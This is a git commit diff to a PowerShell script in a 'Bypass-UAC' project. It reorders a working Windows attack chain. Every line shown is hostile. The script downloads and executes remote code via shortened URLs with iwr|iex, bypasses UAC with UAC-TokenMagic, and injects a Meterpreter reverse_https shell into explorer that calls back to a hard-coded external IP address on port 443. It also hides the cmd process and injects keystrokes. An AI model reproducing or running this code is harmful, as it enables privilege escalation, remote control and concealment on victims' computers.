c4f10350d1ec93c84c003ed0bd256d26cbcabe60
Az <z0rk@protonmail.com>
2017-12-04 17:06:51 +0100

    Update 6.ps1

--- Bypass-UAC/Dropin/6.ps1
+++ Bypass-UAC/Dropin/6.ps1
@@ -4,10 +4,9 @@ workflow Test
 {
     Parallel
     {
-        iwr https://goo.gl/JwTLrZ | iex;iwr https://goo.gl/wxJHHq | iex;iwr https://goo.gl/4QsWoj | iex;
-        sleep 4; UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -ProcPID (ps -Name mmc).id;
-        Invoke-Shellcode -ProcessId $((ps -Name explorer.exe).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443;
+        iwr https://goo.gl/wxJHHq | iex; UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -ProcPID (ps -Name mmc).id;
+        iwr https://goo.gl/4QsWoj | iex; Invoke-Shellcode -ProcessId $((ps -Name explorer).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443;
         sleep 1; $cmd="Invoke-Shellcode -ProcessId $((ps -Name explorer.exe).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443;"
-        sleep 3; hide-process cmd; sleep 0.7; send-keys -Name $cmd -Cmd $cmd
+        iwr https://goo.gl/JwTLrZ | iex; hide-process cmd; sleep 0.7; send-keys -Name $cmd -Cmd $cmd
     }
 }
